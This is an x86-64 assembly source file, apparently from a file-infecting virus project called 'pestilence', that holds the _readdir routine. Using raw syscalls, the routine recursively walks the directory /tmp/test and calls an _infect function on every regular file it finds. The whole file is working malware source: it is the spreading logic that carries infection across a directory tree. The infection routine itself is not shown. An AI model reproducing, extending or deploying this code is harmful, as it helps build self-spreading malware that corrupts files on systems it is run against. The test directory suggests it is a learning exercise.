%define READDIR_S

section .text
	global	_readdir
	%include "pestilence.lst"

;; -----------------------------------------------------------------------------------
;; NAME
;;		_readdir
;;
;; SYNOPSIS
;;		void	_readdir(void)
;;
;; DESCRIPTION
;;		Opens the directory /tmp/test and browses it recursively calling _infect
;;		when a regular file is found.
;;
;; NOTES
;;		It writes the full path of the file/directory under %rsp, moves %rsp down
;;		by its size before call to _readdir or _infect and restores it afterwards.
;;		This way the stack offsets are preserved and the path is not overwritten
;;		by the stack frame of the next function call.
;;
;;		;----------------------------; < %rbp
;;		;     actual stack frame     ;
;;		;----------------------------; < %rsp (base)
;;		;  full file/directory path  ;
;;		;----------------------------;
;;		;        size of path        ;
;;		;----------------------------; < %rsp (temporary)
;;		;     next function call     ;
;;		;----------------------------;
;;
;;		The idea here is for the next function to read the path at %rbp + 24.
;;
;; STACK USAGE
;;		rsp + 0		: directory fd
;;		rsp + 8		: buffer
;;		rsp + 288	: base path length
;;		rsp + 296	: directory name length
;;		rsp + 304	: full path length
;;		rsp + 312	: buffer head
;;		rsp + 320	: buffer tail
;; -----------------------------------------------------------------------------------
_readdir:
	enter	336, 0

_readdir_open:	
	;; Open base directory
	mov		rax, sys_open
	lea		rdi, [rbp + 24]
	mov		rsi, 0
	mov		rdx, 0
	syscall
	cmp		rax, -1
	jle		_readdir_end
	mov		qword [rsp], rax
	
	;; Save up base path length
	lea		rdi, [rbp + 24]
	call	_ft_strlen
	mov		qword [rsp + 288], rax

_readdir_loop:
	;; Get directory content
	mov		rax, sys_getdents64
	mov		rdi, qword [rsp]
	lea		rsi, [rsp + 8]
	mov		rdx, 280
	syscall
	cmp		rax, 0
	jle		_readdir_close

	;; Buffer head
	lea		r10, [rsp + 8]
	mov		qword [rsp + 312], r10

	;; Buffer tail
	lea		r10, [r10 + rax]
	mov		qword [rsp + 320], r10

_readdir_loop_file:
	;; Check if we reached the last dirent64 in the buffer
	mov		r10, qword [rsp + 312]
	cmp		r10, qword [rsp + 320]
	jge		_readdir_loop
	
	;; If file/directory is '.' or '..' move on to next dirent64
	lea		rdi, [r10 + 19]
	cmp		word [rdi], 0x002e
	je		_readdir_next_file
	cmp		word [rdi], 0x2e2e
	je		_readdir_next_file

	;; Save file/directory length
	lea		rdi, [r10 + 19]
	call	_ft_strlen
	mov		qword [rsp + 296], rax

	;; Write full path under %rsp (base path + '/' + directory name + '\0')
	xor		r8, r8
	mov		r8, 2
	add		r8, qword [rsp + 288]
	add		r8, qword [rsp + 296]
	mov		qword [rsp + 304], r8

	;; Move under %rsp to write full path
	mov		rdi, rsp
	sub		rdi, qword [rsp + 304]

	;; Write base path
	lea		rsi, [rbp + 24]
	mov		rcx, qword [rsp + 288]
	cld
	rep		movsb

	;; Write '/'
	mov		byte [rdi], 0x2f
	add		rdi, 1

	;; Write directory/file name
	lea		rsi, [r10 + 19]
	mov		rcx, qword [rsp + 296]
	cld
	rep		movsb

	;; Write '\0'
	mov		byte [rdi], 0

	;; If it's regular file call infection
	mov		r8b, byte [r10 + 18]
	cmp		r8b, DT_REG
	je		_readdir_infect_file

	;; Else if it's a directory call recursive
	mov		r8b, byte [r10 + 18]
	cmp		r8b, DT_DIR
	je		_readdir_infect_directory

	;; Else move on to the next dirent64
	jmp		_readdir_next_file

_readdir_infect_directory:
	;; Move down %rsp by directory path length
	mov		rax, qword [rsp + 304]
	sub		rsp, rax
	push	rax

	;; Call recursive
	call	_readdir
	
	;; Restore %rsp at position before call
	pop		rax
	add		rsp, rax

	;; Move on to the next dirent64
	jmp		_readdir_next_file

_readdir_infect_file:
	;; Move down %rsp by file path length
	mov		rax, qword [rsp + 304]
	sub		rsp, rax
	push	rax

	;; Call infection
	call	_infect
	
	;; Restore %rsp at position before call
	pop		rax
	add		rsp, rax
	
	;; Move on to the next dirent64
	jmp		_readdir_next_file

_readdir_next_file:
	;; Move in buffer by dirent64->d_reclen
	xor		rcx, rcx
	mov		r10, qword [rsp + 312]
	mov		cx, word [r10 + 16]
	lea		r10, [r10 + rcx]
	mov		qword [rsp + 312], r10

	jmp		_readdir_loop_file

_readdir_close:
	mov		rax, 3
	mov		rdi, qword [rsp]
	syscall

_readdir_end:
	leave
	ret

%undef READDIR_S
